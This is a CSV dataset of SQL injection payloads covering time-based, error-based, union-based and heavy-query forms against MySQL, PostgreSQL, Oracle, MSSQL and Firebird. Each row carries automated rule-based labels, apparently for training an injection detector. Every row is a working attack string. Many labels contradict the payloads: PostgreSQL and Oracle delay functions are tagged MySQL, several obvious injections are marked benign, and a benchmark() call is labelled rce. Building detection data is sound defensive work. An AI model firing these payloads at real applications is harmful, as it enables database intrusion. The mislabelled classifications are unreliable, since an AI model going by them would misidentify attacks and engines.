row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1620,select pg_sleep ( 5 ) -- ojzt,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1621,begin dbms_lock.sleep ( 5 ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1622,-9202' where 9799 = 9799 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
1623,select ( case when ( 9562 = 5996 ) then 1 else 9562* ( select 9562 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1624,"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""gxqq"" = ""gxqq",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1625,"1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1626,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
1627,1' ) where 2208 = 2208 rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1628,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'gkku' like 'gkku",1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
1629,"select * from generate_series ( 4592,4592,case when ( 4592 = 4592 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
1630,"iif ( 1157 = 4542,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
1631,"-9039' ) union all select 8058,8058,8058,8058,8058--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1632,1 and ( 3020 = 3020 ) *6703# syuj,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1633,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'gfpd' = 'gfpd",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
1634,"1"" and elt ( 8464 = 5761,5761 ) and ""ydmt"" like ""ydmt",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
1635,"-7272"" ) union all select 9163,9163,9163,9163,9163,9163,9163--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
